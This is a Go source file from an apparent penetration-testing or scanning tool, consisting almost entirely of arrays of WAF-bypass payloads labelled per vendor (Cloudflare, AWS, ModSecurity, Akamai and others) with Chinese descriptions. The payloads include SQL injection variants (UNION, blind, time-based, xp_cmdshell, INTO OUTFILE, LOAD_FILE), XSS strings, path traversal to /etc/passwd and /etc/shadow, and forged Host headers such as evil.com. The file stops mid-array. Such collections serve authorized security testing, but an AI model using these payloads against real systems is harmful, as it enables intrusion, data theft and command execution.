package payload

import "strings"

var wafBypassCloudflare = []Payload{
	{Raw: `1%0bAND%0b1=1`, Description: "CF-垂直TAB绕过空白", WAF: WAFCloudflare},
	{Raw: `1%0cAND%0c1=1`, Description: "CF-换页符绕过空白", WAF: WAFCloudflare},
	{Raw: `/*!50000SELECT*/`, Description: "CF-版本注释绕过", WAF: WAFCloudflare},
	{Raw: `%55NION %53ELECT`, Description: "CF-部分URL编码", WAF: WAFCloudflare},
	{Raw: `UNION/**/SELECT`, Description: "CF-内联注释绕过", WAF: WAFCloudflare},
	{Raw: `%00' UNION SELECT NULL--`, Description: "CF-Null字节绕过", WAF: WAFCloudflare},
	{Raw: `1' UNIunionON SELselectECT 1,2,3--`, Description: "CF-关键词嵌入绕过", WAF: WAFCloudflare},
	{Raw: `%2527`, Description: "CF-双URL编码单引号", WAF: WAFCloudflare},
	{Raw: `1' AND 1=1--%0a`, Description: "CF-尾部换行绕过", WAF: WAFCloudflare},
	{Raw: `/../admin`, Description: "CF-路径遍历目录扫描", WAF: WAFCloudflare},
	{Raw: `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>`, Description: "CF-CharCode XSS", WAF: WAFCloudflare},
	{Raw: `1'+UnIOn%0bSeLeCt+1`, Description: "CF-垂直Tab+大小写", WAF: WAFCloudflare},
	{Raw: `1' UNION ALL SELECT 1--`, Description: "CF-UNION ALL绕过", WAF: WAFCloudflare},
	{Raw: `1'+AND+1=1--`, Description: "CF-Plus分隔AND", WAF: WAFCloudflare},
	{Raw: `1'/*!12345UNION*//*!12345SELECT*/1--`, Description: "CF-高版本注释绕过", WAF: WAFCloudflare},
	{Raw: `1' UNIoN%0dSeLeCt 1--`, Description: "CF-回车+大小写", WAF: WAFCloudflare},
	{Raw: `1'%0bOR%0b1=1--`, Description: "CF-垂直Tab+OR", WAF: WAFCloudflare},
	{Raw: `1%27%20UNION%20SELECT%201`, Description: "CF-全空格编码", WAF: WAFCloudflare},
	{Raw: `1%2527%2520UNION%2520SELECT%25201`, Description: "CF-双URL编码全部", WAF: WAFCloudflare},
	{Raw: `' OR '1'='1'--`, Description: "CF-OR永真字符串", WAF: WAFCloudflare},
	{Raw: `1' AND (SELECT 1)=1--`, Description: "CF-子查询无害验证", WAF: WAFCloudflare},
	{Raw: `1' ORDER BY 100--`, Description: "CF-ORDER BY大数", WAF: WAFCloudflare},
	{Raw: `1' GROUP BY 1--`, Description: "CF-GROUP BY绕过", WAF: WAFCloudflare},
	{Raw: `1' HAVING 1=1--`, Description: "CF-HAVING子句", WAF: WAFCloudflare},
	{Raw: `<img src=x onerror=prompt(1)>`, Description: "CF-prompt替代alert", WAF: WAFCloudflare},
}

var wafBypassAWS = []Payload{
	{Raw: `1' UNIoN SELeCt 1`, Description: "AWS-大小写变换", WAF: WAFAWS},
	{Raw: `1' UNION/**/SELECT/**/1`, Description: "AWS-注释分隔", WAF: WAFAWS},
	{Raw: `1'/**/AND/**/1=1`, Description: "AWS-注释空白", WAF: WAFAWS},
	{Raw: `1'+UnIoN+SeLeCt+1`, Description: "AWS-Plus号空白", WAF: WAFAWS},
	{Raw: `/*!50000UnIoN*/+/*!50000SeLeCt*/+1`, Description: "AWS-版本注释", WAF: WAFAWS},
	{Raw: `<img src=x onerror=prompt(1)>`, Description: "AWS-prompt替代alert", WAF: WAFAWS},
	{Raw: `<body onpageshow=alert(1)>`, Description: "AWS-onpageshow", WAF: WAFAWS},
	{Raw: `%u0027 UNION SELECT 1`, Description: "AWS-Unicode编码", WAF: WAFAWS},
	{Raw: `1' UNION SELECT NULL--`, Description: "AWS-NULL探测", WAF: WAFAWS},
	{Raw: `1' AND (SELECT 1 FROM DUAL)--`, Description: "AWS-DUAL子查询", WAF: WAFAWS},
	{Raw: `1' UNION SELECT 1,2,3,4,5--`, Description: "AWS-多列UNION", WAF: WAFAWS},
	{Raw: `1' && 1=1--`, Description: "AWS-&&替代AND", WAF: WAFAWS},
	{Raw: `1' || 1=1--`, Description: "AWS-||替代OR", WAF: WAFAWS},
	{Raw: `" onmouseover=alert(1)`, Description: "AWS-引号属性注入", WAF: WAFAWS},
	{Raw: `'+(select*from(select(sleep(0)))a)+'`, Description: "AWS-嵌套子查询", WAF: WAFAWS},
	{Raw: `1'+UNION+SELECT+1+--+`, Description: "AWS-后置空白", WAF: WAFAWS},
	{Raw: `1'/*foo*/UNION/*foo*/SELECT/*foo*/1`, Description: "AWS-任意注释内容", WAF: WAFAWS},
}

var wafBypassModSecurity = []Payload{
	{Raw: `1' /*!union*/ /*!select*/ 1`, Description: "MS-版本注释", WAF: WAFModSecurity},
	{Raw: `1' UNIunionON SELselectECT 1`, Description: "MS-关键词内嵌", WAF: WAFModSecurity},
	{Raw: `1' UN/**/ION SEL/**/ECT 1`, Description: "MS-关键词中断", WAF: WAFModSecurity},
	{Raw: `%55%4e%49%4f%4e %53%45%4c%45%43%54`, Description: "MS-全URL编码", WAF: WAFModSecurity},
	{Raw: `1' AND extractvalue(1,concat(0x7e,version()))--`, Description: "MS-函数绕过", WAF: WAFModSecurity},
	{Raw: `1' aND 1=1--`, Description: "MS-关键字变体", WAF: WAFModSecurity},
	{Raw: `%2f*%2a!50000%55nIoN%2a%2f %2f*%2a!50000%53eLeCt%2a%2f`, Description: "MS-编码+版本注释", WAF: WAFModSecurity},
	{Raw: `1' AND 0x7e=0x7e--`, Description: "MS-Hex比较绕过", WAF: WAFModSecurity},
	{Raw: `1' AND '1'='1`, Description: "MS-字符串永真", WAF: WAFModSecurity},
	{Raw: `1' && '1'='1`, Description: "MS-&&符号", WAF: WAFModSecurity},
	{Raw: `1' ^ 1=1 ^ '1`, Description: "MS-XOR绕过", WAF: WAFModSecurity},
	{Raw: `%u0055NION %u0053ELECT`, Description: "MS-Unicode编码", WAF: WAFModSecurity},
	{Raw: `1' OR 1=1#`, Description: "MS-井号注释", WAF: WAFModSecurity},
	{Raw: `1' AND 1=1;%00`, Description: "MS-分号+Null", WAF: WAFModSecurity},
	{Raw: `1'|1=1`, Description: "MS-管道OR", WAF: WAFModSecurity},
	{Raw: `1'&1=1`, Description: "MS-&AND", WAF: WAFModSecurity},
	{Raw: `1' AND '1' NOT '2'`, Description: "MS-NOT绕过", WAF: WAFModSecurity},
	{Raw: `1' UNION SELECT 1`, Description: "MS-无空格UNION", WAF: WAFModSecurity},
}

var wafBypassIncapsula = []Payload{
	{Raw: `1' ORDER BY 10--`, Description: "IC-ORDER BY探测", WAF: WAFIncapsula},
	{Raw: `1' AND SLEEP(1)--`, Description: "IC-短延时探测", WAF: WAFIncapsula},
	{Raw: `1' AND '1'='1`, Description: "IC-字符串比较", WAF: WAFIncapsula},
	{Raw: `\x27 UNION SELECT 1`, Description: "IC-十六进制引号", WAF: WAFIncapsula},
	{Raw: `1' UNION SELECT 1 FROM DUAL--`, Description: "IC-DUAL绕过", WAF: WAFIncapsula},
	{Raw: `1' AND 1=1 LIMIT 1--`, Description: "IC-LIMIT减少返回", WAF: WAFIncapsula},
	{Raw: `1' AND BENCHMARK(5000000,MD5(1))--`, Description: "IC-BENCHMARK延时", WAF: WAFIncapsula},
	{Raw: `1' UNION ALL SELECT 1--`, Description: "IC-UNION ALL", WAF: WAFIncapsula},
	{Raw: `1' GROUP BY CONCAT(1,2,3,4)--`, Description: "IC-GROUP BY绕过", WAF: WAFIncapsula},
	{Raw: `1'||(SELECT 1)`, Description: "IC-管道OR子查询", WAF: WAFIncapsula},
	{Raw: `1' --+`, Description: "IC-后置加号注释", WAF: WAFIncapsula},
	{Raw: `1' /*!00000union*/ /*!00000select*/ 1`, Description: "IC-假版本号注释", WAF: WAFIncapsula},
	{Raw: `/../../etc/passwd`, Description: "IC-深层路径遍历", WAF: WAFIncapsula},
}

var wafBypassF5 = []Payload{
	{Raw: `1' UNION SELECT 1--`, Description: "F5-基础UNION", WAF: WAFF5},
	{Raw: `1'+UNION+SELECT+1--`, Description: "F5-Plus空白", WAF: WAFF5},
	{Raw: `1'/**/UNION/**/SELECT/**/1--`, Description: "F5-注释空白", WAF: WAFF5},
	{Raw: `1' UniOn SelEct 1--`, Description: "F5-大小写混用", WAF: WAFF5},
	{Raw: "1' AND 1=1-- \n", Description: "F5-尾部换行绕过", WAF: WAFF5},
	{Raw: `1' AND 1=1--\r\n`, Description: "F5-尾部CRLF", WAF: WAFF5},
	{Raw: `1' AND 1=1--\t`, Description: "F5-尾部TAB", WAF: WAFF5},
	{Raw: `1' AND (1)=1--`, Description: "F5-括号分隔", WAF: WAFF5},
	{Raw: `1' && 1=1--`, Description: "F5-双&符号", WAF: WAFF5},
	{Raw: `1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--`, Description: "F5-JOIN子查询", WAF: WAFF5},
	{Raw: `1' %4F%52 1=1--`, Description: "F5-URL编码OR", WAF: WAFF5},
	{Raw: `1'/**//**/UNION/**//**/SELECT/**//**/1`, Description: "F5-双注释", WAF: WAFF5},
}

var wafBypassBarracuda = []Payload{
	{Raw: `1' UNunionION SELselectECT 1--`, Description: "BC-关键词内嵌", WAF: WAFBarracuda},
	{Raw: `1'/**/AND/**/1=1--`, Description: "BC-注释分隔", WAF: WAFBarracuda},
	{Raw: `1'+UnIon+SelEct+1--`, Description: "BC-大小写+Plus", WAF: WAFBarracuda},
	{Raw: `1' AND 1=1#`, Description: "BC-#注释", WAF: WAFBarracuda},
	{Raw: `1' UNION SELECT NULL,NULL--`, Description: "BC-双NULL探测", WAF: WAFBarracuda},
	{Raw: `1' -- -`, Description: "BC-多段注释", WAF: WAFBarracuda},
	{Raw: `1' /*/*/UNION/*/*/SELECT/*/*/1`, Description: "BC-嵌套注释", WAF: WAFBarracuda},
	{Raw: `1' AND (1)>(0)--`, Description: "BC-真值比较", WAF: WAFBarracuda},
	{Raw: `1' AND 1 LIKE 1--`, Description: "BC-LIKE替代=", WAF: WAFBarracuda},
	{Raw: `1' AND 1 BETWEEN 1 AND 1--`, Description: "BC-BETWEEN绕过", WAF: WAFBarracuda},
}

var wafBypassSucuri = []Payload{
	{Raw: `1' UNION SELECT 1--`, Description: "SC-基础UNION", WAF: WAFSucuri},
	{Raw: `1'/**/AND/**/'1'='1`, Description: "SC-注释绕过", WAF: WAFSucuri},
	{Raw: `1' ORDER BY 100--`, Description: "SC-ORDER BY", WAF: WAFSucuri},
	{Raw: `"><img src=x onerror=alert(1)>`, Description: "SC-XSS img", WAF: WAFSucuri},
	{Raw: `1' UNION ALL SELECT 1,2--`, Description: "SC-UNION ALL多列", WAF: WAFSucuri},
	{Raw: `1' AND 1=IF(1=1,1,0)--`, Description: "SC-IF条件", WAF: WAFSucuri},
	{Raw: `1'/*!union*/+/*!select*/+1`, Description: "SC-版本注释+Plus", WAF: WAFSucuri},
	{Raw: `1' OR 1=1--`, Description: "SC-OR永真数字", WAF: WAFSucuri},
	{Raw: `%27%20UNION%20SELECT%201`, Description: "SC-全URL编码", WAF: WAFSucuri},
}

var wafBypassAkamai = []Payload{
	{Raw: `1' AND 1=1--`, Description: "AK-基础AND", WAF: WAFAkamai},
	{Raw: `1'/**/UNION/**/SELECT/**/1`, Description: "AK-全注释", WAF: WAFAkamai},
	{Raw: `1' UnIoN SeLeCt 1`, Description: "AK-大小写", WAF: WAFAkamai},
	{Raw: `1' /*!00000UNION*/ /*!00000SELECT*/ 1`, Description: "AK-假版本注释", WAF: WAFAkamai},
	{Raw: `1' UNION SELECT 1`, Description: "AK-无注释UNION", WAF: WAFAkamai},
	{Raw: `1' AND '1'&'1'='1`, Description: "AK-位运算AND", WAF: WAFAkamai},
	{Raw: `1' AND 1=1--+`, Description: "AK-后加号注释", WAF: WAFAkamai},
	{Raw: `1'+UNION+SELECT+1`, Description: "AK-Plus分隔", WAF: WAFAkamai},
	{Raw: `<script>eval('al'+'ert(1)')</script>`, Description: "AK-XSS eval拼接", WAF: WAFAkamai},
}

var wafBypassGeneric = []Payload{
	{Raw: `%27+AND+1%3D1--`, Description: "通用-URL编码单引号", WAF: WAFGeneric},
	{Raw: `%2527+AND+1%25253D1--`, Description: "通用-多级URL编码", WAF: WAFGeneric},
	{Raw: `\x27+AND+1\x3D1--`, Description: "通用-\\x hex编码", WAF: WAFGeneric},
	{Raw: `' UNION SELECT 1,2,3,4,5,6,7,8,9,10--`, Description: "通用-多列UNION", WAF: WAFGeneric},
	{Raw: `' AND 1=1 LIMIT 1--`, Description: "通用-LIMIT限制", WAF: WAFGeneric},
	{Raw: `' AND SLEEP(0)--`, Description: "通用-零延时探测", WAF: WAFGeneric},
	{Raw: `' AND BENCHMARK(1000000,MD5(1))--`, Description: "通用-BENCHMARK探测", WAF: WAFGeneric},
	{Raw: `1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--`, Description: "通用-SUBSTRING盲注", WAF: WAFGeneric},
	{Raw: `1' OR 2+373-373-1=0+0+0+1--`, Description: "通用-数学运算绕过", WAF: WAFGeneric},
	{Raw: `%bf%27 UNION SELECT 1,2,3--`, Description: "通用-GBK宽字节注入", WAF: WAFGeneric},
	{Raw: "`' AND 1=1--`", Description: "通用-反引号绕过", WAF: WAFGeneric},
	{Raw: `1' AND '1'='1'--`, Description: "通用-AND永真", WAF: WAFGeneric},
	{Raw: `1'||'1'='1`, Description: "通用-OR管道符", WAF: WAFGeneric},
	{Raw: `'+(select*from(select(sleep(0)))a)+'`, Description: "通用-子查询嵌套", WAF: WAFGeneric},
	{Raw: `1' AND 1=1#`, Description: "通用-井号注释", WAF: WAFGeneric},
	{Raw: `1' AND 1=1;--`, Description: "通用-分号+双横线", WAF: WAFGeneric},
	{Raw: `\x3c\x73\x63\x72\x69\x70\x74\x3ealert(1)\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e`, Description: "通用-全Hex XSS", WAF: WAFGeneric},
	{Raw: `<IMG SRC="javascript:alert('XSS')">`, Description: "通用-IMG大写+JS", WAF: WAFGeneric},
	{Raw: `" onmouseover="alert(1)`, Description: "通用-onmouseover", WAF: WAFGeneric},
	{Raw: `../etc/passwd`, Description: "通用-路径遍历", WAF: WAFGeneric},
	{Raw: `....//....//etc/passwd`, Description: "通用-双点斜杠绕过清理", WAF: WAFGeneric},
	{Raw: `/etc/passwd%00.jpg`, Description: "通用-Null字节绕过扩展名", WAF: WAFGeneric},
	{Raw: `../../../../../../etc/passwd`, Description: "通用-深层路径遍历", WAF: WAFGeneric},
	{Raw: `..%5c..%5c..%5cwindows\\win.ini`, Description: "通用-反斜杠编码路径", WAF: WAFGeneric},
	{Raw: `....//....//....//etc/shadow`, Description: "通用-多点斜杠双写", WAF: WAFGeneric},
	{Raw: `%2e%2e%2f%2e%2e%2f%65%74%63/passwd`, Description: "通用-URL编码路径遍历", WAF: WAFGeneric},
	{Raw: `..%252f..%252f..%252fetc/passwd`, Description: "通用-双URL编码路径遍历", WAF: WAFGeneric},
	{Raw: `..\..\..\..\windows\win.ini`, Description: "通用-Windows路径遍历", WAF: WAFGeneric},
}

var wafBypassHPP = []Payload{
	{Raw: `id=1&id=' UNION SELECT 1--`, Description: "HPP参数覆盖", WAF: WAFGeneric},
	{Raw: `id=1&id=2&id=' UNION SELECT NULL--`, Description: "HPP三参数覆盖", WAF: WAFGeneric},
	{Raw: `id[]=1&id[]=' UNION SELECT 1--`, Description: "HPP数组参数", WAF: WAFGeneric},
}

var wafBypassContentType = []Payload{
	{Raw: `Content-Type: multipart/form-data; boundary=--`, Description: "CT-multipart边界", WAF: WAFGeneric},
	{Raw: `Content-Type: application/x-www-form-urlencoded; charset=gbk`, Description: "CT-GBK编码", WAF: WAFGeneric},
	{Raw: `Content-Type: text/xml`, Description: "CT-XML类型", WAF: WAFGeneric},
	{Raw: `Content-Type: application/json`, Description: "CT-JSON类型", WAF: WAFGeneric},
}

var wafBypassChunkedTransfer = []Payload{
	{Raw: `Transfer-Encoding: chunked`, Description: "Chunked-分块传输", WAF: WAFGeneric},
	{Raw: `Transfer-Encoding: chunked\r\n\r\n5\r\nadmin\r\n0\r\n\r\n`, Description: "Chunked-body分块", WAF: WAFGeneric},
}

var wafBypassMethodMangling = []Payload{
	{Raw: `X-HTTP-Method-Override: GET`, Description: "Method-Override GET", WAF: WAFGeneric},
	{Raw: `X-HTTP-Method-Override: POST`, Description: "Method-Override POST", WAF: WAFGeneric},
	{Raw: `X-HTTP-Method: PUT`, Description: "Method-X-HTTP-Method", WAF: WAFGeneric},
	{Raw: `X-METHOD-OVERRIDE: DELETE`, Description: "Method-X-METHOD-OVERRIDE", WAF: WAFGeneric},
}

var wafBypassHostHeader = []Payload{
	{Raw: `Host: evil.com`, Description: "Host-伪造主机头", WAF: WAFGeneric},
	{Raw: `Host: localhost`, Description: "Host-localhost", WAF: WAFGeneric},
	{Raw: `Host: 127.0.0.1`, Description: "Host-127.0.0.1", WAF: WAFGeneric},
	{Raw: `X-Forwarded-Host: evil.com`, Description: "XFH-伪造主机", WAF: WAFGeneric},
}

var wafBypassPathNormalization = []Payload{
	{Raw: `/Admin`, Description: "Path-大写Admin", WAF: WAFGeneric},
	{Raw: `/ADMIN`, Description: "Path-全大写ADMIN", WAF: WAFGeneric},
	{Raw: `/admin/`, Description: "Path-尾部斜杠", WAF: WAFGeneric},
	{Raw: `//admin`, Description: "Path-双斜杠", WAF: WAFGeneric},
	{Raw: `/./admin`, Description: "Path-./admin", WAF: WAFGeneric},
	{Raw: `/admin;.js`, Description: "Path-分号扩展名", WAF: WAFGeneric},
	{Raw: `/admin%00`, Description: "Path-Null截断", WAF: WAFGeneric},
	{Raw: `/admin%20`, Description: "Path-空格后缀", WAF: WAFGeneric},
	{Raw: `/admin%09`, Description: "Path-TAB后缀", WAF: WAFGeneric},
	{Raw: `/admin.json`, Description: "Path-json后缀", WAF: WAFGeneric},
	{Raw: `/admin.aspx`, Description: "Path-aspx后缀", WAF: WAFGeneric},
	{Raw: `/admin.jsp`, Description: "Path-jsp后缀", WAF: WAFGeneric},
	{Raw: `/%2e%2e/%61dmin`, Description: "Path-.. URL编码", WAF: WAFGeneric},
	{Raw: `/admin..;/`, Description: "Path-双点分号", WAF: WAFGeneric},
}

var wafBypassWideBytePayloads = []Payload{
	{Raw: `%df%27 UNION SELECT 1--`, Description: "GBK宽字节1", WAF: WAFGeneric},
	{Raw: `%bf%27 UNION SELECT 1--`, Description: "GBK宽字节2", WAF: WAFGeneric},
	{Raw: `%aa%27 OR 1=1--`, Description: "GBK宽字节OR", WAF: WAFGeneric},
	{Raw: `%df' UNION SELECT 1--`, Description: "GBK宽字节不带编码", WAF: WAFGeneric},
	{Raw: `%81%27 UNION SELECT 1--`, Description: "GBK宽字节变体", WAF: WAFGeneric},
}

var wafBypassNullBytePayloads = []Payload{
	{Raw: `%00' UNION SELECT 1--`, Description: "Null字节前缀", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1--%00`, Description: "Null字节后缀", WAF: WAFGeneric},
}

var wafBypassBufferOverflowPayloads = []Payload{
	{Raw: `' UNION SELECT NULL` + strings.Repeat("A", 5000) + `--`, Description: "缓冲区溢出5000", WAF: WAFGeneric},
	{Raw: `' UNION SELECT NULL--` + strings.Repeat(" ", 1000), Description: "尾部空格填充", WAF: WAFGeneric},
}

var wafBypassEncodingChainPayloads = []Payload{
	{Raw: `%27%20/*!50000UNION*//*!50000SELECT*/%201`, Description: "URL编码+版本注释", WAF: WAFGeneric},
	{Raw: `%u0027%20%u0055NION%20%u0053ELECT%201`, Description: "Unicode全部编码", WAF: WAFGeneric},
}

var wafBypassSQLKeywords = []Payload{
	{Raw: `1' SELECT 1--`, Description: "KW-基础SELECT", WAF: WAFGeneric},
	{Raw: `1' INSERT INTO x VALUES(1)--`, Description: "KW-INSERT注入", WAF: WAFGeneric},
	{Raw: `1' UPDATE x SET y=1--`, Description: "KW-UPDATE注入", WAF: WAFGeneric},
	{Raw: `1' DELETE FROM x--`, Description: "KW-DELETE注入", WAF: WAFGeneric},
	{Raw: `1' DROP TABLE x--`, Description: "KW-DROP TABLE", WAF: WAFGeneric},
	{Raw: `1' CREATE TABLE x(y int)--`, Description: "KW-CREATE TABLE", WAF: WAFGeneric},
	{Raw: `1' ALTER TABLE x ADD y int--`, Description: "KW-ALTER TABLE", WAF: WAFGeneric},
	{Raw: `1' TRUNCATE TABLE x--`, Description: "KW-TRUNCATE", WAF: WAFGeneric},
	{Raw: `1' EXEC xp_cmdshell 'dir'--`, Description: "KW-xp_cmdshell", WAF: WAFGeneric},
	{Raw: `1' EXEC sp_executesql N'select 1'--`, Description: "KW-sp_executesql", WAF: WAFGeneric},
	{Raw: `1' INTO OUTFILE '/tmp/x'--`, Description: "KW-INTO OUTFILE", WAF: WAFGeneric},
	{Raw: `1' INTO DUMPFILE '/tmp/x'--`, Description: "KW-INTO DUMPFILE", WAF: WAFGeneric},
	{Raw: `1' LOAD_FILE('/etc/passwd')--`, Description: "KW-LOAD_FILE", WAF: WAFGeneric},
	{Raw: `1' GROUP_CONCAT(1,2,3)--`, Description: "KW-GROUP_CONCAT", WAF: WAFGeneric},
	{Raw: `1' CONCAT(1,2,3)--`, Description: "KW-CONCAT", WAF: WAFGeneric},
	{Raw: `1' CONCAT_WS(',',1,2,3)--`, Description: "KW-CONCAT_WS", WAF: WAFGeneric},
}

var wafBypassCommentStyles = []Payload{
	{Raw: `1'--`, Description: "注释-双横线", WAF: WAFGeneric},
	{Raw: `1'#`, Description: "注释-井号", WAF: WAFGeneric},
	{Raw: `1';%00`, Description: "注释-分号Null", WAF: WAFGeneric},
	{Raw: `1'/*comment*/`, Description: "注释-块注释", WAF: WAFGeneric},
	{Raw: `1'/***/`, Description: "注释-空块注释", WAF: WAFGeneric},
	{Raw: `1'/**_**/`, Description: "注释-_块注释", WAF: WAFGeneric},
	{Raw: `1'/*!*/`, Description: "注释-!空注释", WAF: WAFGeneric},
	{Raw: `1'/*!00000*/`, Description: "注释-!00000", WAF: WAFGeneric},
	{Raw: `1'/*!50000*/`, Description: "注释-!50000", WAF: WAFGeneric},
	{Raw: `1'` + "`--`", Description: "注释-反引号注释", WAF: WAFGeneric},
	{Raw: `1'%23`, Description: "注释-URL编码#", WAF: WAFGeneric},
	{Raw: `1'--+-`, Description: "注释-加号双横线", WAF: WAFGeneric},
	{Raw: `1'--%0a`, Description: "注释-换行双横线", WAF: WAFGeneric},
}

var wafBypassSpaces = []Payload{
	{Raw: `1'%20AND%201=1`, Description: "空格-%20空格", WAF: WAFGeneric},
	{Raw: `1'%09AND%091=1`, Description: "空格-%09Tab", WAF: WAFGeneric},
	{Raw: `1'%0aAND%0a1=1`, Description: "空格-%0a换行", WAF: WAFGeneric},
	{Raw: `1'%0bAND%0b1=1`, Description: "空格-%0b垂直Tab", WAF: WAFGeneric},
	{Raw: `1'%0cAND%0c1=1`, Description: "空格-%0c换页", WAF: WAFGeneric},
	{Raw: `1'%0dAND%0d1=1`, Description: "空格-%0d回车", WAF: WAFGeneric},
	{Raw: `1'%a0AND%a01=1`, Description: "空格-%a0不间断空格", WAF: WAFGeneric},
	{Raw: `1'/**/AND/**/1=1`, Description: "空格-块注释", WAF: WAFGeneric},
	{Raw: `1'+AND+1=1`, Description: "空格-加号", WAF: WAFGeneric},
	{Raw: `1' AND(1)=1`, Description: "空格-括号", WAF: WAFGeneric},
	{Raw: "`1'`AND`1`=1", Description: "空格-反引号", WAF: WAFGeneric},
	{Raw: `1' "AND" 1=1`, Description: "空格-双引号", WAF: WAFGeneric},
}

var wafBypassLogicalOperators = []Payload{
	{Raw: `1' AND 1=1--`, Description: "逻辑-AND =", WAF: WAFGeneric},
	{Raw: `1' AND 1<2--`, Description: "逻辑-AND <", WAF: WAFGeneric},
	{Raw: `1' AND 2>1--`, Description: "逻辑-AND >", WAF: WAFGeneric},
	{Raw: `1' AND 1<=1--`, Description: "逻辑-AND <=", WAF: WAFGeneric},
	{Raw: `1' AND 1>=1--`, Description: "逻辑-AND >=", WAF: WAFGeneric},
	{Raw: `1' AND 1!=2--`, Description: "逻辑-AND !=", WAF: WAFGeneric},
	{Raw: `1' AND 1<>2--`, Description: "逻辑-AND <>", WAF: WAFGeneric},
	{Raw: `1' AND 1 LIKE 1--`, Description: "逻辑-AND LIKE", WAF: WAFGeneric},
	{Raw: `1' AND 1 REGEXP 1--`, Description: "逻辑-AND REGEXP", WAF: WAFGeneric},
	{Raw: `1' AND 1 RLIKE 1--`, Description: "逻辑-AND RLIKE", WAF: WAFGeneric},
	{Raw: `1' AND 1 BETWEEN 1 AND 1--`, Description: "逻辑-AND BETWEEN", WAF: WAFGeneric},
	{Raw: `1' AND 1 IN(1)--`, Description: "逻辑-AND IN", WAF: WAFGeneric},
	{Raw: `1' AND 1 IS NOT NULL--`, Description: "逻辑-AND IS NOT NULL", WAF: WAFGeneric},
	{Raw: `1' AND 'a'='a'--`, Description: "逻辑-AND字符串=", WAF: WAFGeneric},
	{Raw: `1' AND 'a'||'a'='aa'--`, Description: "逻辑-AND字符串||", WAF: WAFGeneric},
	{Raw: `1' AND NOT 1=2--`, Description: "逻辑-AND NOT", WAF: WAFGeneric},
	{Raw: `1' AND !(1=2)--`, Description: "逻辑-AND !", WAF: WAFGeneric},
	{Raw: `1' || 1=1--`, Description: "逻辑-||", WAF: WAFGeneric},
	{Raw: `1' && 1=1--`, Description: "逻辑-&&", WAF: WAFGeneric},
}

var wafBypassUnionVariants = []Payload{
	{Raw: `1' UNION SELECT 1--`, Description: "UNION-基础", WAF: WAFGeneric},
	{Raw: `1' UNION ALL SELECT 1--`, Description: "UNION-ALL", WAF: WAFGeneric},
	{Raw: `1' UNION DISTINCT SELECT 1--`, Description: "UNION-DISTINCT", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1,2,3--`, Description: "UNION-3列", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1,2,3,4,5--`, Description: "UNION-5列", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--`, Description: "UNION-10列", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--`, Description: "UNION-15列", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--`, Description: "UNION-20列", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT NULL--`, Description: "UNION-NULL单列", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT NULL,NULL--`, Description: "UNION-双NULL", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT NULL,NULL,NULL,NULL,NULL--`, Description: "UNION-5NULL", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT * FROM (SELECT 1)a--`, Description: "UNION-子查询", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT * FROM (SELECT 1)a,(SELECT 2)b--`, Description: "UNION-多子查询", WAF: WAFGeneric},
	{Raw: `1' UNION(SELECT 1)--`, Description: "UNION-括号", WAF: WAFGeneric},
	{Raw: `(1)UNION(SELECT(1))--`, Description: "UNION-全括号", WAF: WAFGeneric},
	{Raw: `1'UNION(SELECT(1))--`, Description: "UNION-连写括号", WAF: WAFGeneric},
}

var wafBypassOrderByVariants = []Payload{
	{Raw: `1' ORDER BY 1--`, Description: "OB-1", WAF: WAFGeneric},
	{Raw: `1' ORDER BY 10--`, Description: "OB-10", WAF: WAFGeneric},
	{Raw: `1' ORDER BY 100--`, Description: "OB-100", WAF: WAFGeneric},
	{Raw: `1' ORDER BY 1000--`, Description: "OB-1000", WAF: WAFGeneric},
	{Raw: `1' ORDER BY 1 ASC--`, Description: "OB-ASC", WAF: WAFGeneric},
	{Raw: `1' ORDER BY 1 DESC--`, Description: "OB-DESC", WAF: WAFGeneric},
	{Raw: `1' GROUP BY 1--`, Description: "OB-GROUP BY", WAF: WAFGeneric},
	{Raw: `1' GROUP BY 1,2,3--`, Description: "OB-GROUP BY多列", WAF: WAFGeneric},
}

var wafBypassStringConcat = []Payload{
	{Raw: `1' AND 'a' 'b'='ab'--`, Description: "字串-空格拼接", WAF: WAFGeneric},
	{Raw: `1' AND 'a'+'b'='ab'--`, Description: "字串-加号拼接", WAF: WAFGeneric},
	{Raw: `1' AND CONCAT('a','b')='ab'--`, Description: "字串-CONCAT", WAF: WAFGeneric},
	{Raw: `1' AND CONCAT_WS(',','a','b')='a,b'--`, Description: "字串-CONCAT_WS", WAF: WAFGeneric},
	{Raw: `1' AND CONCAT(CHAR(97),CHAR(98))='ab'--`, Description: "字串-CONCAT+CHAR", WAF: WAFGeneric},
	{Raw: `1' AND GROUP_CONCAT('a','b')='ab'--`, Description: "字串-GROUP_CONCAT", WAF: WAFGeneric},
}

var wafBypassCharEncoding = []Payload{
	{Raw: `1' AND CHAR(97)=CHAR(97)--`, Description: "字符-CHAR函数", WAF: WAFGeneric},
	{Raw: `1' AND CHAR(97,98,99)='abc'--`, Description: "字符-CHAR多字符", WAF: WAFGeneric},
	{Raw: `1' AND 0x61646d696e='admin'--`, Description: "字符-0x前缀Hex", WAF: WAFGeneric},
	{Raw: `1' AND X'61646d696e'='admin'--`, Description: "字符-X前缀Hex", WAF: WAFGeneric},
	{Raw: `1' AND x'61646d696e'='admin'--`, Description: "字符-x小写Hex", WAF: WAFGeneric},
	{Raw: `1' AND UNHEX('61646d696e')='admin'--`, Description: "字符-UNHEX", WAF: WAFGeneric},
	{Raw: `1' AND HEX('admin')='61646d696e'--`, Description: "字符-HEX", WAF: WAFGeneric},
	{Raw: `1' AND CONV('a',36,10)=CONV(10,10,36)--`, Description: "字符-CONV进制转换", WAF: WAFGeneric},
	{Raw: `1' AND BIN(97)='1100001'--`, Description: "字符-BIN", WAF: WAFGeneric},
